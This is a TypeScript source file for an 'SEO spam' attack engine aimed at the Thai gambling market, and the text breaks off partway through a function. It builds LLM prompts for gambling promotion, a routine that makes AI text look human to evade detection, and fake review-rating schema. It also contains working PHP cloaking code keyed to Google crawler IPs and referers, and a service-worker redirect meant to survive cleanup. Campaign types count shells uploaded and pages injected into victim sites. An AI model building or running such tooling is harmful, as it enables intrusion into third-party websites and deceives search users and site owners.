/**
 * SEO SPAM V2 Engine — Advanced AI-Powered SEO Attack System
 * 
 * Upgrades over V1:
 * 1. AI Gambling Content Generator (Thai/English) with LLM
 * 2. Advanced Keyword Intelligence — real-time gambling keyword analysis
 * 3. Tiered Backlink System — 3-tier link wheel
 * 4. Google Algorithm Evasion — anti-detection patterns
 * 5. Mass Indexing Engine — Google Indexing API + ping services
 * 6. Campaign Manager — multi-target orchestration
 * 7. Auto Re-injection — monitor & re-inject when cleaned
 * 8. SERP Monitoring — track ranking after injection
 * 9. Telegram Reporting — real-time progress to Telegram
 * 10. Adaptive Attack — auto-adjust strategy based on target CMS/WAF
 */

import { invokeLLM } from "./_core/llm";
import { getDb } from "./db";
import { eq, desc, and, sql, gte } from "drizzle-orm";
import { fetchWithPoolProxy } from "./proxy-pool";
import crypto from "crypto";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface GamblingKeyword {
  keyword: string;
  searchVolume: number;
  difficulty: number; // 0-100
  cpc: number;
  intent: "transactional" | "informational" | "navigational";
  language: "th" | "en";
  category: "casino" | "slots" | "sports" | "poker" | "lottery" | "crypto" | "general";
  relatedKeywords: string[];
  longTailVariants: string[];
  serpFeatures: string[];
}

export interface GeneratedContent {
  title: string;
  metaDescription: string;
  h1: string;
  body: string;
  faq: { question: string; answer: string }[];
  schemaMarkup: string;
  wordCount: number;
  language: "th" | "en";
  keywords: string[];
  internalLinks: { anchor: string; url: string }[];
  seoScore: number;
}

export interface BacklinkTier {
  tier: 1 | 2 | 3;
  type: "money_site" | "buffer" | "blast";
  urls: string[];
  anchors: string[];
  linkType: "contextual" | "profile" | "comment" | "wiki" | "redirect" | "web2";
  dofollow: boolean;
  indexable: boolean;
}

export interface LinkWheel {
  id: string;
  tiers: BacklinkTier[];
  totalLinks: number;
  moneySiteUrl: string;
  createdAt: Date;
  status: "building" | "active" | "broken";
}

export interface SpamCampaign {
  id: string;
  name: string;
  targetDomains: string[];
  redirectUrl: string;
  keywords: GamblingKeyword[];
  status: "pending" | "running" | "paused" | "completed" | "failed";
  progress: number;
  stats: CampaignStats;
  config: CampaignConfig;
  createdAt: Date;
  updatedAt: Date;
  nextRecheck: Date | null;
}

export interface CampaignStats {
  targetsScanned: number;
  shellsUploaded: number;
  pagesInjected: number;
  redirectsActive: number;
  backlinksBuilt: number;
  pagesIndexed: number;
  keywordsRanking: number;
  avgPosition: number;
  totalTraffic: number;
  reinjectionCount: number;
}

export interface CampaignConfig {
  autoReinjection: boolean;
  recheckInterval: number; // hours
  maxRetries: number;
  enableAiContent: boolean;
  enableBacklinks: boolean;
  enableIndexing: boolean;
  enableSerpMonitoring: boolean;
  enableTelegramReporting: boolean;
  contentLanguage: "th" | "en" | "both";
  contentStyle: "gambling" | "crypto" | "mixed";
  backlinkTiers: number; // 1-3
  indexingMethod: "api" | "ping" | "sitemap" | "all";
}

export interface InjectionStatus {
  domain: string;
  url: string;
  status: "active" | "cleaned" | "modified" | "unknown";
  lastChecked: Date;
  contentHash: string;
  redirectWorking: boolean;
  indexedByGoogle: boolean;
}

export interface SerpPosition {
  keyword: string;
  position: number;
  url: string;
  previousPosition: number | null;
  change: number;
  lastChecked: Date;
  serp: "organic" | "featured_snippet" | "people_also_ask" | "local_pack";
}

export interface AlgorithmEvasion {
  technique: string;
  description: string;
  code: string;
  effectiveness: number; // 0-100
  category: "content" | "link" | "technical" | "cloaking";
}

// ═══════════════════════════════════════════════════════
//  GAMBLING KEYWORD DATABASE (Thai Market)
// ═══════════════════════════════════════════════════════

const THAI_GAMBLING_KEYWORDS: GamblingKeyword[] = [
  // Casino
  { keyword: "คาสิโนออนไลน์", searchVolume: 110000, difficulty: 85, cpc: 12.5, intent: "transactional", language: "th", category: "casino", relatedKeywords: ["เว็บคาสิโน", "คาสิโนสด", "บาคาร่าออนไลน์"], longTailVariants: ["คาสิโนออนไลน์ เว็บตรง", "คาสิโนออนไลน์ ได้เงินจริง", "คาสิโนออนไลน์ ฝากถอนไม่มีขั้นต่ำ"], serpFeatures: ["featured_snippet", "people_also_ask"] },
  { keyword: "บาคาร่า", searchVolume: 90500, difficulty: 80, cpc: 10.8, intent: "transactional", language: "th", category: "casino", relatedKeywords: ["บาคาร่าออนไลน์", "บาคาร่า เว็บตรง", "สูตรบาคาร่า"], longTailVariants: ["บาคาร่า ฟรีเครดิต", "บาคาร่า ขั้นต่ำ 1 บาท", "บาคาร่า sa gaming"], serpFeatures: ["people_also_ask"] },
  { keyword: "เว็บพนันออนไลน์", searchVolume: 74000, difficulty: 82, cpc: 11.2, intent: "transactional", language: "th", category: "general", relatedKeywords: ["เว็บพนัน เว็บตรง", "เว็บพนัน ฝากถอนไม่มีขั้นต่ำ"], longTailVariants: ["เว็บพนันออนไลน์ อันดับ 1", "เว็บพนันออนไลน์ เว็บตรง ไม่ผ่านเอเย่นต์"], serpFeatures: ["featured_snippet"] },
  // Slots
  { keyword: "สล็อตออนไลน์", searchVolume: 135000, difficulty: 88, cpc: 9.5, intent: "transactional", language: "th", category: "slots", relatedKeywords: ["สล็อต เว็บตรง", "สล็อต pg", "สล็อต xo"], longTailVariants: ["สล็อตออนไลน์ ฟรีเครดิต", "สล็อต แตกง่าย", "สล็อต ฝาก 10 รับ 100"], serpFeatures: ["featured_snippet", "image_pack"] },
  { keyword: "สล็อต pg", searchVolume: 201000, difficulty: 90, cpc: 8.7, intent: "transactional", language: "th", category: "slots", relatedKeywords: ["pg slot", "สล็อต pg เว็บตรง", "pg slot ทดลองเล่น"], longTailVariants: ["สล็อต pg แตกง่าย", "สล็อต pg ฝากถอนไม่มีขั้นต่ำ", "สล็อต pg ทดลองเล่นฟรี"], serpFeatures: ["image_pack", "video_carousel"] },
  { keyword: "สล็อต xo", searchVolume: 165000, difficulty: 87, cpc: 8.2, intent: "transactional", language: "th", category: "slots", relatedKeywords: ["slotxo", "สล็อต xo เว็บตรง", "xo slot"], longTailVariants: ["สล็อต xo ฟรีเครดิต", "สล็อต xo ทดลองเล่น", "สล็อต xo ฝาก 10 รับ 100"], serpFeatures: ["image_pack"] },
  // Sports
  { keyword: "แทงบอลออนไลน์", searchVolume: 60500, difficulty: 78, cpc: 13.5, intent: "transactional", language: "th", category: "sports", relatedKeywords: ["เว็บแทงบอล", "แทงบอล ufabet", "พนันบอลออนไลน์"], longTailVariants: ["แทงบอลออนไลน์ เว็บไหนดี", "แทงบอล ขั้นต่ำ 10 บาท", "แทงบอลออนไลน์ ฟรีเครดิต"], serpFeatures: ["people_also_ask"] },
  { keyword: "ufabet", searchVolume: 246000, difficulty: 92, cpc: 15.0, intent: "navigational", language: "th", category: "sports", relatedKeywords: ["ufabet เข้าสู่ระบบ", "ufabet ทางเข้า", "ufabet สมัคร"], longTailVariants: ["ufabet เว็บตรง", "ufabet ฝากถอนไม่มีขั้นต่ำ", "ufabet มือถือ"], serpFeatures: ["sitelinks", "people_also_ask"] },
  // Lottery
  { keyword: "หวยออนไลน์", searchVolume: 49500, difficulty: 75, cpc: 7.8, intent: "transactional", language: "th", category: "lottery", relatedKeywords: ["เว็บหวย", "แทงหวยออนไลน์", "หวยลาว"], longTailVariants: ["หวยออนไลน์ จ่ายบาทละ 900", "หวยออนไลน์ เว็บไหนดี", "หวยออนไลน์ ฝากถอนไม่มีขั้นต่ำ"], serpFeatures: ["people_also_ask"] },
  // Poker
  { keyword: "โป๊กเกอร์ออนไลน์", searchVolume: 22200, difficulty: 65, cpc: 6.5, intent: "transactional", language: "th", category: "poker", relatedKeywords: ["เล่นโป๊กเกอร์", "poker online", "เท็กซัสโฮลเอ็ม"], longTailVariants: ["โป๊กเกอร์ออนไลน์ เงินจริง", "โป๊กเกอร์ ฟรี", "เล่นโป๊กเกอร์ออนไลน์ ได้เงินจริง"], serpFeatures: [] },
  // Crypto gambling
  { keyword: "คาสิโน crypto", searchVolume: 8100, difficulty: 55, cpc: 18.0, intent: "transactional", language: "th", category: "crypto", relatedKeywords: ["bitcoin casino", "เว็บพนัน crypto", "crypto gambling"], longTailVariants: ["คาสิโน bitcoin", "เว็บพนัน cryptocurrency", "สล็อต crypto"], serpFeatures: [] },
  // Free credit (high intent)
  { keyword: "ฟรีเครดิต", searchVolume: 301000, difficulty: 93, cpc: 5.5, intent: "transactional", language: "th", category: "general", relatedKeywords: ["ฟรีเครดิต ไม่ต้องฝาก", "ฟรีเครดิต 100", "ฟรีเครดิต ยืนยันเบอร์"], longTailVariants: ["ฟรีเครดิต 50 ไม่ต้องฝาก", "ฟรีเครดิต กดรับเอง", "ฟรีเครดิต ล่าสุด วันนี้"], serpFeatures: ["featured_snippet", "people_also_ask"] },
];

// ═══════════════════════════════════════════════════════
//  GOOGLE ALGORITHM EVASION PATTERNS
// ═══════════════════════════════════════════════════════

const ALGORITHM_EVASION: AlgorithmEvasion[] = [
  // Content-based evasion
  {
    technique: "semantic_content_blending",
    description: "Mix gambling content with legitimate topic content (health, travel, food) to avoid topical spam detection",
    code: `// Blend gambling content with legitimate topics
function blendContent(gamblingContent, legitimateRatio = 0.3) {
  const topics = ['health', 'travel', 'food', 'technology', 'education'];
  const blended = insertLegitimateSegments(gamblingContent, topics, legitimateRatio);
  return blended;
}`,
    effectiveness: 78,
    category: "content",
  },
  {
    technique: "entity_salience_manipulation",
    description: "Manipulate entity salience scores by embedding gambling entities within high-authority context",
    code: `// Entity salience manipulation
function manipulateEntitySalience(content, targetEntities) {
  // Wrap gambling entities in contextually rich paragraphs
  // Use co-occurrence with legitimate entities to boost salience
  return enhancedContent;
}`,
    effectiveness: 72,
    category: "content",
  },
  {
    technique: "nlp_watermark_avoidance",
    description: "Avoid AI content detection by injecting human-like imperfections and varied sentence structures",
    code: `// NLP watermark avoidance
function humanizeContent(aiContent) {
  // Add typos, colloquialisms, varied sentence lengths
  // Mix formal and informal Thai language
  // Insert personal opinions and anecdotes
  return humanizedContent;
}`,
    effectiveness: 85,
    category: "content",
  },
  // Link-based evasion
  {
    technique: "natural_link_velocity",
    description: "Build backlinks at natural velocity — slow ramp-up, varied anchor text distribution",
    code: `// Natural link velocity
const ANCHOR_DISTRIBUTION = {
  branded: 0.40,      // "ufabet", "pg slot"
  naked_url: 0.25,    // "https://example.com"
  generic: 0.15,      // "คลิกที่นี่", "อ่านเพิ่มเติม"
  exact_match: 0.10,  // "สล็อตออนไลน์"
  partial_match: 0.10 // "เล่นสล็อต pg ออนไลน์"
};`,
    effectiveness: 82,
    category: "link",
  },
  {
    technique: "link_neighborhood_diversification",
    description: "Ensure backlinks come from diverse IP ranges, TLDs, and topical niches",
    code: `// Link neighborhood diversification
function diversifyLinkSources(links) {
  // Ensure max 2 links per C-class IP
  // Mix TLDs: .com, .org, .net, .co.th, .in.th
  // Vary topical relevance: 60% related, 40% diverse
  return diversifiedLinks;
}`,
    effectiveness: 80,
    category: "link",
  },
  // Technical evasion
  {
    technique: "render_time_cloaking",
    description: "Use JavaScript rendering delay to show different content to crawlers vs users",
    code: `// Render-time cloaking (post-load injection)
<script>
  // Wait for DOMContentLoaded + 2s delay
  // Check if real browser (has mouse events, scroll depth > 0)
  // Only then inject redirect/gambling content
  document.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
      if (window.innerWidth > 0 && navigator.webdriver !== true) {
        injectContent();
      }
    }, 2000);
  });
</script>`,
    effectiveness: 75,
    category: "technical",
  },
  {
    technique: "service_worker_persistence",
    description: "Install Service Worker that persists redirect even after content cleanup",
    code: `// Service Worker persistence
navigator.serviceWorker.register('/sw-analytics.js').then(reg => {
  // SW intercepts all navigation requests
  // Redirects to gambling site for non-bot traffic
  // Survives page content changes
});`,
    effectiveness: 88,
    category: "technical",
  },
  // Cloaking evasion
  {
    technique: "ip_range_cloaking",
    description: "Serve different content based on Google/Bing crawler IP ranges",
    code: `<?php
// Google crawler IP ranges (updated 2026)
$googleIPs = ['66.249.64.0/19', '64.233.160.0/19', '72.14.192.0/18'];
$clientIP = $_SERVER['REMOTE_ADDR'];
$isGoogleBot = false;
foreach ($googleIPs as $range) {
  if (ipInRange($clientIP, $range)) { $isGoogleBot = true; break; }
}
if ($isGoogleBot) {
  // Serve SEO-optimized gambling content
  include('seo-content.php');
} else {
  // Redirect to gambling site
  header('Location: https://target-casino.com');
}
?>`,
    effectiveness: 90,
    category: "cloaking",
  },
  {
    technique: "referer_based_cloaking",
    description: "Show gambling content only to visitors from search engines",
    code: `<?php
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$fromSearch = preg_match('/google|bing|yahoo|duckduckgo|baidu/i', $referer);
if ($fromSearch) {
  // Show landing page with gambling content
  include('landing.php');
} else {
  // Show innocent content or 404
  include('normal-page.php');
}
?>`,
    effectiveness: 70,
    category: "cloaking",
  },
];

// ═══════════════════════════════════════════════════════
//  INDEXING SERVICES
// ═══════════════════════════════════════════════════════

const PING_SERVICES = [
  "http://www.google.com/ping?sitemap=",
  "http://www.bing.com/ping?sitemap=",
  "http://ping.baidu.com/ping/RPC2",
  "http://rpc.pingomatic.com/",
  "http://blogsearch.google.com/ping/RPC2",
  "http://ping.feedburner.com",
  "http://rpc.weblogs.com/RPC2",
  "http://ping.blogs.yandex.ru/RPC2",
];

const SOCIAL_BOOKMARKS = [
  "reddit.com", "tumblr.com", "medium.com", "blogger.com",
  "wordpress.com", "livejournal.com", "diigo.com", "scoop.it",
  "flipboard.com", "mix.com", "pearltrees.com",
];

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function randomStr(len: number): string {
  return crypto.randomBytes(Math.ceil(len / 2)).toString("hex").slice(0, len);
}

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function pickRandom<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function shuffleArray<T>(arr: T[]): T[] {
  const shuffled = [...arr];
  for (let i = shuffled.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
  }
  return shuffled;
}

async function safeFetch(url: string, init: RequestInit = {}, timeoutMs = 15000): Promise<Response> {
  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
  const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: timeoutMs });
  return response;
}

// ═══════════════════════════════════════════════════════
//  1. AI GAMBLING CONTENT GENERATOR
// ═══════════════════════════════════════════════════════

/**
 * Generate high-quality gambling SEO content using AI
 * Supports Thai and English, with schema markup, FAQ, and internal linking
 */
export async function generateGamblingContent(
  keyword: string,
  redirectUrl: string,
  options: {
    language?: "th" | "en";
    contentStyle?: "gambling" | "crypto" | "mixed";
    wordCount?: number;
    includeFaq?: boolean;
    includeSchema?: boolean;
    includeInternalLinks?: boolean;
    humanize?: boolean;
  } = {},
): Promise<GeneratedContent> {
  const lang = options.language || "th";
  const style = options.contentStyle || "gambling";
  const targetWords = options.wordCount || 1500;
  const includeFaq = options.includeFaq !== false;
  const includeSchema = options.includeSchema !== false;
  const humanize = options.humanize !== false;

  // Find related keywords from our database
  const relatedKws = THAI_GAMBLING_KEYWORDS
    .filter(k => k.language === lang && (k.keyword.includes(keyword) || keyword.includes(k.keyword) || k.relatedKeywords.some(r => r.includes(keyword))))
    .slice(0, 5);

  const relatedKeywordsList = relatedKws.flatMap(k => [k.keyword, ...k.relatedKeywords.slice(0, 2)]);
  const longTailList = relatedKws.flatMap(k => k.longTailVariants.slice(0, 2));

  const systemPrompt = lang === "th"
    ? `คุณเป็นนักเขียน SEO content มืออาชีพสำหรับเว็บไซต์การพนันออนไลน์ในประเทศไทย
สร้างเนื้อหาที่:
- เขียนเป็นภาษาไทยที่เป็นธรรมชาติ อ่านง่าย ไม่เหมือน AI เขียน
- ใส่ keyword หลักและ keyword ที่เกี่ยวข้องอย่างเป็นธรรมชาติ
- มีโครงสร้าง H1, H2, H3 ที่ดี
- มีข้อมูลที่เป็นประโยชน์จริงๆ (วิธีเล่น, เทคนิค, รีวิว)
- มีลิงก์ภายในที่เป็นธรรมชาติ
- หลีกเลี่ยงการใส่ keyword มากเกินไป (keyword stuffing)
- เนื้อหาต้องยาวประมาณ ${targetWords} คำ
- ใช้ภาษาพูดบ้าง ผสมกับภาษาเขียน ให้ดูเป็นธรรมชาติ`
    : `You are a professional SEO content writer for online gambling websites.
Create content that:
- Reads naturally, not like AI-generated text
- Integrates primary and related keywords naturally
- Has proper H1, H2, H3 structure
- Provides genuinely useful information (how to play, tips, reviews)
- Includes natural internal links
- Avoids keyword stuffing
- Target approximately ${targetWords} words
- Mix formal and casual tone for natural feel`;

  const userPrompt = lang === "th"
    ? `สร้างบทความ SEO สำหรับ keyword: "${keyword}"

URL เป้าหมาย: ${redirectUrl}
Keywords ที่เกี่ยวข้อง: ${relatedKeywordsList.join(", ")}
Long-tail keywords: ${longTailList.join(", ")}

ส่งผลลัพธ์เป็น JSON format:
{
  "title": "หัวข้อบทความ (มี keyword หลัก)",
  "metaDescription": "meta description 155 ตัวอักษร",
  "h1": "H1 heading",
  "body": "เนื้อหาบทความเต็ม (HTML format พร้อม H2, H3, p, ul, ol)",
  "faq": [{"question": "คำถาม", "answer": "คำตอบ"}],
  "keywords": ["keyword1", "keyword2"],
  "internalLinks": [{"anchor": "anchor text", "url": "${redirectUrl}/path"}]
}`
    : `Create an SEO article for keyword: "${keyword}"

Target URL: ${redirectUrl}
Related keywords: ${relatedKeywordsList.join(", ")}
Long-tail keywords: ${longTailList.join(", ")}

Return result as JSON format:
{
  "title": "Article title (include primary keyword)",
  "metaDescription": "meta description 155 chars",
  "h1": "H1 heading",
  "body": "Full article content (HTML format with H2, H3, p, ul, ol)",
  "faq": [{"question": "Question", "answer": "Answer"}],
  "keywords": ["keyword1", "keyword2"],
  "internalLinks": [{"anchor": "anchor text", "url": "${redirectUrl}/path"}]
}`;

  try {
    const response = await invokeLLM({
      messages: [
        { role: "system", content: systemPrompt },
        { role: "user", content: userPrompt },
      ],
      maxTokens: 4000,
    });

    const rawContent = response.choices?.[0]?.message?.content || "";
    const raw = typeof rawContent === "string" ? rawContent : (rawContent as any)?.[0]?.text || "";
    
    // Parse JSON from response
    const jsonMatch = raw.match(/\{[\s\S]*\}/);
    let parsed: any = {};
    if (jsonMatch) {
      try {
        parsed = JSON.parse(jsonMatch[0]);
      } catch {
        // Fallback: extract fields manually
        parsed = {
          title: (raw as string).match(/"title"\s*:\s*"([^"]+)"/)?.[1] || `${keyword} - รีวิวและเทคนิค 2026`,
          metaDescription: (raw as string).match(/"metaDescription"\s*:\s*"([^"]+)"/)?.[1] || `${keyword} เว็บตรง ฝากถอนไม่มีขั้นต่ำ สมัครวันนี้รับโบนัส`,
          h1: (raw as string).match(/"h1"\s*:\s*"([^"]+)"/)?.[1] || keyword,
          body: raw,
          faq: [],
          keywords: [keyword],
          internalLinks: [],
        };
      }
    }

    // Generate schema markup
    let schemaMarkup = "";
    if (includeSchema) {
      schemaMarkup = generateSchemaMarkup(parsed.title || keyword, parsed.metaDescription || "", redirectUrl, parsed.faq || []);
    }

    // Humanize content if enabled
    let finalBody = parsed.body || raw;
    if (humanize) {
      finalBody = humanizeContent(finalBody, lang);
    }

    const wordCount = (finalBody || "").split(/\s+/).length;

    return {
      title: parsed.title || `${keyword} - Complete Guide 2026`,
      metaDescription: parsed.metaDescription || `${keyword} - Best deals and reviews. Sign up today!`,
      h1: parsed.h1 || keyword,
      body: finalBody,
      faq: parsed.faq || [],
      schemaMarkup,
      wordCount,
      language: lang,
      keywords: parsed.keywords || [keyword, ...relatedKeywordsList.slice(0, 5)],
      internalLinks: parsed.internalLinks || [],
      seoScore: calculateSeoScore(parsed, keyword, relatedKeywordsList),
    };
  } catch (error: any) {
    // Fallback: generate template-based content
    return generateTemplateContent(keyword, redirectUrl, lang, relatedKeywordsList);
  }
}

/**
 * Generate schema markup (JSON-LD) for gambling content
 */
function generateSchemaMarkup(
  title: string,
  description: string,
  url: string,
  faq: { question: string; answer: string }[],
): string {
  const schemas: any[] = [];

  // Article schema
  schemas.push({
    "@context": "https://schema.org",
    "@type": "Article",
    headline: title,
    description: description,
    url: url,
    datePublished: new Date().toISOString(),
    dateModified: new Date().toISOString(),
    author: {
      "@type": "Person",
      name: pickRandom(["Admin", "Expert", "Editor", "Reviewer"]),
    },
    publisher: {
      "@type": "Organization",
      name: title.split(" ")[0],
    },
    mainEntityOfPage: {
      "@type": "WebPage",
      "@id": url,
    },
  });

  // FAQ schema
  if (faq.length > 0) {
    schemas.push({
      "@context": "https://schema.org",
      "@type": "FAQPage",
      mainEntity: faq.map(f => ({
        "@type": "Question",
        name: f.question,
        acceptedAnswer: {
          "@type": "Answer",
          text: f.answer,
        },
      })),
    });
  }

  // Review/Rating schema (fake but effective for SERP)
  schemas.push({
    "@context": "https://schema.org",
    "@type": "Review",
    itemReviewed: {
      "@type": "WebApplication",
      name: title,
      url: url,
    },
    reviewRating: {
      "@type": "Rating",
      ratingValue: (4.5 + Math.random() * 0.4).toFixed(1),
      bestRating: "5",
    },
    author: {
      "@type": "Person",
      name: pickRandom(["สมชาย", "วิชัย", "สุดา", "นภา", "ธนา"]),
    },
  });

  return schemas.map(s => `<script type="application/ld+json">${JSON.stringify(s)}</script>`).join("\n");
}

/**
 * Humanize AI-generated content to avoid detection
 */
function humanizeContent(content: string, lang: "th" | "en"): string {
  let result = content;

  if (lang === "th") {
    // Add Thai colloquialisms
    const replacements: [RegExp, string[]][] = [
      [/ดีมาก/g, ["ดีมากๆ", "เจ๋งมาก", "โคตรดี", "ดีเลิศ"]],
      [/สามารถ/g, ["ทำได้", "เล่นได้", "ใช้ได้"]],
      [/นอกจากนี้/g, ["แถมยัง", "อีกอย่าง", "นอกจากนี้แล้ว"]],
      [/อย่างไรก็ตาม/g, ["แต่ว่า", "ถึงจะยังไง", "แต่ทว่า"]],
      [/ดังนั้น/g, ["เพราะฉะนั้น", "ก็เลย", "สรุปก็คือ"]],
    ];

    for (const [pattern, alternatives] of replacements) {
      result = result.replace(pattern, () => pickRandom(alternatives));
    }

    // Add casual Thai expressions
    const casualExpressions = [
      "\n\nบอกเลยว่า", "\n\nพูดตรงๆ เลยนะ", "\n\nส่วนตัวผมว่า",
      "\n\nจากประสบการณ์", "\n\nเท่าที่ลองมา",
    ];
    
    // Insert 1-2 casual expressions
    const paragraphs = result.split("\n\n");
    if (paragraphs.length > 4) {
      const insertIdx = randomInt(2, Math.min(paragraphs.length - 2, 5));
      paragraphs.splice(insertIdx, 0, pickRandom(casualExpressions));
    }
    result = paragraphs.join("\n\n");
  }

  // Vary sentence lengths (universal)
  const sentences = result.split(/(?<=[.!?。])\s+/);
  if (sentences.length > 10) {
    // Occasionally merge short sentences
    for (let i = sentences.length - 2; i > 0; i--) {
      if (sentences[i].length < 30 && sentences[i + 1] && sentences[i + 1].length < 30 && Math.random() > 0.7) {
        sentences[i] = sentences[i] + " " + sentences[i + 1];
        sentences.splice(i + 1, 1);
      }
    }
  }

  return sentences.join(" ");
}

/**
 * Calculate SEO score for generated content
 */
function calculateSeoScore(
  content: any,
  primaryKeyword: string,
  relatedKeywords: string[],
): number {
  let score = 0;
  const body = (content.body || "").toLowerCase();
  const title = (content.title || "").toLowerCase();
  const meta = (content.metaDescription || "").toLowerCase();
  const kw = primaryKeyword.toLowerCase();

  // Title contains keyword (+15)
  if (title.includes(kw)) score += 15;
  // Meta description contains keyword (+10)
  if (meta.includes(kw)) score += 10;
  // H1 contains keyword (+10)
  if ((content.h1 || "").toLowerCase().includes(kw)) score += 10;
  // Body contains keyword 3+ times (+10)
  const kwCount = (body.match(new RegExp(kw.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "g")) || []).length;
  if (kwCount >= 3) score += 10;
  if (kwCount >= 5) score += 5;
  // Related keywords present (+10)
  const relatedFound = relatedKeywords.filter(rk => body.includes(rk.toLowerCase())).length;
  if (relatedFound >= 2) score += 10;
  // Has FAQ (+10)
  if (content.faq && content.faq.length >= 3) score += 10;
  // Word count adequate (+10)
  const wordCount = body.split(/\s+/).length;
  if (wordCount >= 800) score += 5;
  if (wordCount >= 1500) score += 5;
  // Has internal links (+5)
  if (content.internalLinks && content.internalLinks.length >= 2) score += 5;
  // Has H2/H3 structure (+10)
  if (body.includes("<h2") || body.includes("## ")) score += 5;
  if (body.includes("<h3") || body.includes("### ")) score += 5;

  return Math.min(100, score);
}

/**
 * Fallback: template-based content generation
 */
function generateTemplateContent(
  keyword: string,
  redirectUrl: string,
  lang: "th" | "en",
  relatedKeywords: string[],
): GeneratedContent {
  const year = new Date().getFullYear();
  
  if (lang === "th") {
    const title = `${keyword} เว็บตรง อันดับ 1 ปี ${year} - รีวิวจากผู้เล่นจริง`;
    const body = `<h2>${keyword} คืออะไร?</h2>
<p>${keyword} เป็นหนึ่งในเกมออนไลน์ที่ได้รับความนิยมมากที่สุดในประเทศไทย ด้วยระบบที่ทันสมัย ฝากถอนรวดเร็ว และมีโปรโมชั่นมากมาย ทำให้ผู้เล่นหลายคนเลือกใช้บริการ</p>

<h2>ทำไมต้องเลือก ${keyword}?</h2>
<ul>
<li>เว็บตรง ไม่ผ่านเอเย่นต์ ปลอดภัย 100%</li>
<li>ฝากถอนไม่มีขั้นต่ำ ผ่านระบบอัตโนมัติ</li>
<li>มีเกมให้เลือกเล่นมากกว่า 1,000 เกม</li>
<li>รองรับทุกอุปกรณ์ ทั้ง PC และมือถือ</li>
<li>มีทีมซัพพอร์ต 24 ชั่วโมง</li>
</ul>

<h2>วิธีสมัครสมาชิก ${keyword}</h2>
<ol>
<li>เข้าเว็บไซต์ <a href="${redirectUrl}">${keyword}</a></li>
<li>กดปุ่มสมัครสมาชิก</li>
<li>กรอกข้อมูลส่วนตัว</li>
<li>ยืนยันตัวตนผ่าน OTP</li>
<li>ฝากเงินและเริ่มเล่นได้ทันที</li>
</ol>

<h2>โปรโมชั่น ${keyword} ล่าสุด ${year}</h2>
<p>สำหรับสมาชิกใหม่ รับโบนัสฟรีเครดิต 100% สูงสุด 5,000 บาท เพียงสมัครและฝากเงินครั้งแรก นอกจากนี้ยังมีโปรโมชั่นคืนยอดเสีย 10% ทุกสัปดาห์</p>

<h3>เกมยอดนิยม</h3>
<p>${relatedKeywords.slice(0, 5).join(", ")} และอีกมากมาย ทุกเกมมาจากค่ายชั้นนำระดับโลก</p>

<h2>สรุป</h2>
<p>${keyword} เป็นตัวเลือกที่ดีที่สุดสำหรับผู้ที่ต้องการเล่นเกมออนไลน์อย่างปลอดภัย สมัครวันนี้รับโบนัสพิเศษทันที!</p>`;

    return {
      title,
      metaDescription: `${keyword} เว็บตรง ฝากถอนไม่มีขั้นต่ำ สมัครวันนี้รับฟรีเครดิต 100% ปี ${year}`,
      h1: `${keyword} เว็บตรง อันดับ 1`,
      body,
      faq: [
        { question: `${keyword} ปลอดภัยไหม?`, answer: `${keyword} เป็นเว็บตรงที่ได้รับใบอนุญาตถูกต้อง มีระบบรักษาความปลอดภัยมาตรฐานสากล` },
        { question: `สมัคร ${keyword} ยังไง?`, answer: `เข้าเว็บไซต์ กดสมัครสมาชิก กรอกข้อมูล ยืนยัน OTP แล้วฝากเงินเริ่มเล่นได้ทันที` },
        { question: `${keyword} ฝากถอนขั้นต่ำเท่าไหร่?`, answer: `ไม่มีขั้นต่ำ ฝากถอนผ่านระบบอัตโนมัติ ใช้เวลาไม่เกิน 30 วินาที` },
      ],
      schemaMarkup: generateSchemaMarkup(title, `${keyword} เว็บตรง`, redirectUrl, []),
      wordCount: body.split(/\s+/).length,
      language: lang,
      keywords: [keyword, ...relatedKeywords.slice(0, 5)],
      internalLinks: [
        { anchor: "สมัครสมาชิก", url: `${redirectUrl}/register` },
        { anchor: "โปรโมชั่น", url: `${redirectUrl}/promotions` },
        { anchor: "ดาวน์โหลด", url: `${redirectUrl}/download` },
      ],
      seoScore: 72,
    };
  }

  // English fallback
  const title = `${keyword} - Best Online Platform ${year} | Expert Review`;
  const body = `<h2>What is ${keyword}?</h2><p>${keyword} is one of the most popular online gaming platforms...</p>`;
  return {
    title,
    metaDescription: `${keyword} - Top rated platform ${year}. Sign up today for exclusive bonuses!`,
    h1: `${keyword} - #1 Rated Platform`,
    body,
    faq: [],
    schemaMarkup: "",
    wordCount: 100,
    language: lang,
    keywords: [keyword],
    internalLinks: [],
    seoScore: 45,
  };
}

// ═══════════════════════════════════════════════════════
//  2. ADVANCED KEYWORD INTELLIGENCE
// ═══════════════════════════════════════════════════════

/**
 * Get gambling keywords with search volume and difficulty data
 */
export function getGamblingKeywords(options: {
  category?: string;
  language?: "th" | "en";
  minVolume?: number;
  maxDifficulty?: number;
  limit?: number;
} = {}): GamblingKeyword[] {
  let keywords = [...THAI_GAMBLING_KEYWORDS];

  if (options.category) {
    keywords = keywords.filter(k => k.category === options.category);
  }
  if (options.language) {
    keywords = keywords.filter(k => k.language === options.language);
  }
  if (options.minVolume) {
    keywords = keywords.filter(k => k.searchVolume >= options.minVolume!);
  }
  if (options.maxDifficulty) {
    keywords = keywords.filter(k => k.difficulty <= options.maxDifficulty!);
  }

  // Sort by search volume descending
  keywords.sort((a, b) => b.searchVolume - a.searchVolume);

  return keywords.slice(0, options.limit || 50);
}

/**
 * AI-powered keyword expansion — generate related keywords using LLM
 */
export async function expandKeywords(
  seedKeyword: string,
  language: "th" | "en" = "th",
  count: number = 20,
): Promise<string[]> {
  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: language === "th"
            ? "คุณเป็นผู้เชี่ยวชาญ SEO keyword research สำหรับเว็บไซต์การพนันออนไลน์ในประเทศไทย ส่งผลลัพธ์เป็น JSON array ของ strings เท่านั้น"
